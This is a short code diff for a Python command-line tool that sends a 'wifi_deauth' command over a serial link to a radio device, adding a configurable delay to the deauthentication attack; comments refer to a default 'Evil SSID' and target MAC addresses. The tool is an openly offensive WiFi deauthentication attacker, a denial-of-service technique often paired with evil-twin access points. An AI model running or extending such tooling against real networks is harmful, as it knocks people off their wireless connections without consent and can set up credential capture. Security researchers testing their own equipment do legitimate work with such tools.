@@ -8,7 +8,8 @@ from utils import connect_serial
 @click.argument('ap', default="") # Setup your default Macs here
 @click.argument("ssid", default="None") # Setup your default Evil SSID here
 @click.argument('chan', default=11) # Setup your default Chan here
-def main(target, ap, chan, ssid):
+@click.argument('delay', default=1000) # Setup your default delay here
+def main(target, ap, chan, ssid, delay):
 	try:
 		targetInput = input(
 			"[?] Select a target (default '%s'): " % target)
@@ -22,6 +23,14 @@ def main(target, ap, chan, ssid):
 		apInput = input("[?] Select an AP (default '%s'): " % ap)
 		if apInput != "":
 			ap = apInput
+	except KeyboardInterrupt:
+		print("\n[+] Exiting...")
+		exit()
+
+	try:
+		delayInput = input("[?] Select delay (default '%s'): " % delay)
+		if delayInput != "":
+			delay = int(delayInput)
 	except KeyboardInterrupt:
 		print("\n[+] Exiting...")
 		exit()
@@ -97,7 +106,7 @@ def main(target, ap, chan, ssid):
 		print("Error 3 setting channel, exiting...")
 		exit()
 		
-	ser.write(("wifi_deauth %s %s %s 1000 1\r\n" % (target, ap, ssid)).encode())
+	ser.write(("wifi_deauth %s %s %s %d 1\r\n" % (target, ap, ssid, delay)).encode())
 	print("[+] Deauther started...")
 
 	try:
